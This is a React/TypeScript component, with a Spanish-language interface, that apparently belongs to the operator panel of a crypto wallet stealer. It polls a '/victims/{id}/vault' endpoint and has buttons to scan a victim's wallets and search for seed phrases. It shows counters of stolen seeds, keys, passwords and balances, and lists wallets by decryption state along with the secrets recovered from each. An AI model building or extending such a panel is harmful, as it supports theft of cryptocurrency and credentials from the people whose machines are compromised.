'use client';
import { useState } from 'react';
import { ChevronDown, ChevronRight, KeyRound, Search, Wallet } from 'lucide-react';
import { useApi } from '@/hooks/useApi';
import type { VaultResponse } from '@/lib/types';
import { ago, dateTime, mask } from '@/lib/format';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Empty, ErrorState, SkeletonRows } from '@/components/ui/table';
import { StateChip, VaultDrawer } from '@/components/vault-drawer';
import { cn } from '@/lib/cn';

const STATES = ['', 'decrypted', 'locked', 'found', 'no_vault', 'failed'] as const;

export function VaultList({ victimId, onAction, disabled }: { victimId: string; onAction: (id: string) => void; disabled: boolean }) {
  const vault = useApi<VaultResponse>(`/victims/${victimId}/vault`, { pollMs: 10_000 });
  const [open, setOpen] = useState<string | null>(null);
  const [state, setState] = useState('');
  const [drawer, setDrawer] = useState<string | null>(null);
  const data = vault.data;
  const groups = (data?.groups ?? []).filter((group) => !state || group.wallets.some((wallet) => wallet.state === state));

  return (
    <div className="space-y-3">
      <div className="flex flex-wrap items-center gap-2">
        <Button size="sm" variant="secondary" disabled={disabled} onClick={() => onAction('scan')}><Wallet className="h-3 w-3" /> Escanear wallets</Button>
        <Button size="sm" variant="secondary" disabled={disabled} onClick={() => onAction('find-seeds')}><Search className="h-3 w-3" /> Buscar seeds</Button>
        <div className="ml-auto flex flex-wrap gap-1">
          {STATES.map((value) => (
            <button key={value || 'all'} className="chip" data-active={state === value} onClick={() => setState(value)}>
              {value || 'todo'} {value && data ? data.groups.reduce((sum, group) => sum + group.wallets.filter((wallet) => wallet.state === value).length, 0) : ''}
            </button>
          ))}
        </div>
      </div>

      {data ? (
        <div className="grid grid-cols-3 gap-2 sm:grid-cols-6">
          {[
            ['wallets', data.counters.wallets], ['targets', data.counters.targets], ['seeds', data.counters.seeds],
            ['claves', data.counters.keys], ['contraseñas', data.counters.passwords], ['balance', data.counters.balances]
          ].map(([label, value]) => (
            <div key={label} className="rounded-lg border border-line bg-panel/40 px-2 py-1.5">
              <p className="text-2xs text-muted">{label}</p>
              <p className="num text-lg text-ink">{value}</p>
            </div>
          ))}
        </div>
      ) : null}

      <p className="text-2xs text-muted">
        Último escaneo: {data?.lastScan ? <span className="font-mono">{data.lastScan.name} · {data.lastScan.status} · {ago(data.lastScan.finishedAt ?? data.lastScan.createdAt)}</span> : '—'}
        {data?.lastScan?.error ? <span className="ml-1 text-bad">{data.lastScan.error}</span> : null}
      </p>

      {vault.loading && !data ? <SkeletonRows rows={8} cols={4} /> : vault.error ? <ErrorState message={vault.error.message} retry={vault.refresh} /> : groups.length === 0 ? (
        <Empty
          title={state ? 'Ninguna wallet en ese estado' : 'Sin wallets'}
          hint={state ? 'Cambia el filtro o lanza un escaneo nuevo.' : 'Pulsa Escanear wallets. Los resultados aparecen agrupados por target.'}
          action={!state ? <Button size="sm" disabled={disabled} onClick={() => onAction('scan')}>Escanear wallets</Button> : undefined}
        />
      ) : group()}
      <VaultDrawer walletId={drawer} onClose={() => setDrawer(null)} />
    </div>
  );

  function group() {
    return (
      <div className="space-y-2">
        {groups.map((item) => {
          const expanded = open === item.targetId;
          const visible = item.wallets.filter((wallet) => !state || wallet.state === state);
          if (visible.length === 0) return null;
          return (
            <section key={item.targetId} className="rounded-lg border border-line bg-panel/30">
              <button
                className="flex w-full items-center gap-2 px-3 py-2 text-left hover:bg-panel-2/60"
                aria-expanded={expanded}
                onClick={() => setOpen(expanded ? null : item.targetId)}
              >
                {expanded ? <ChevronDown className="h-3.5 w-3.5 text-muted" /> : <ChevronRight className="h-3.5 w-3.5 text-muted" />}
                <span className="font-mono text-xs text-ink">{item.label || item.targetId}</span>
                <Badge>{item.kind}</Badge>
                <StateChip state={item.state} />
                {item.address ? <span className="font-mono text-2xs text-muted">{mask(item.address, 10)}</span> : <span className="text-2xs text-muted">address —</span>}
                {item.balance && item.balance !== '0' ? <span className="num text-2xs text-warn">{item.balance}</span> : null}
                <span className="ml-auto text-2xs text-muted">{visible.length} perfiles · {ago(item.lastSeenAt)}</span>
              </button>
              {expanded ? (
                <div className="divide-y divide-line/60 border-t border-line/60">
                  {visible.map((wallet) => (
                    <button key={wallet.id} className="flex w-full items-center gap-2 px-3 py-1.5 text-left hover:bg-panel-2/60" onClick={() => setDrawer(wallet.id)}>
                      <span className="h-1.5 w-1.5 rounded-full bg-line" />
                      <span className="max-w-[45%] truncate font-mono text-2xs text-muted" title={wallet.path}>{wallet.path}</span>
                      <StateChip state={wallet.state} />
                      <span className="ml-auto flex items-center gap-2 text-2xs text-muted">
                        {wallet.secretCount ? <span className="text-ok"><KeyRound className="inline h-3 w-3" /> {wallet.secretCount}</span> : null}
                        {wallet.secrets.some((secret) => secret.kind === 'seed') ? <Badge tone="ok">seed</Badge> : null}
                        {dateTime(wallet.lastSeenAt)}
                      </span>
                    </button>
                  ))}
                </div>
              ) : null}
            </section>
          );
        })}
      </div>
    );
  }
}
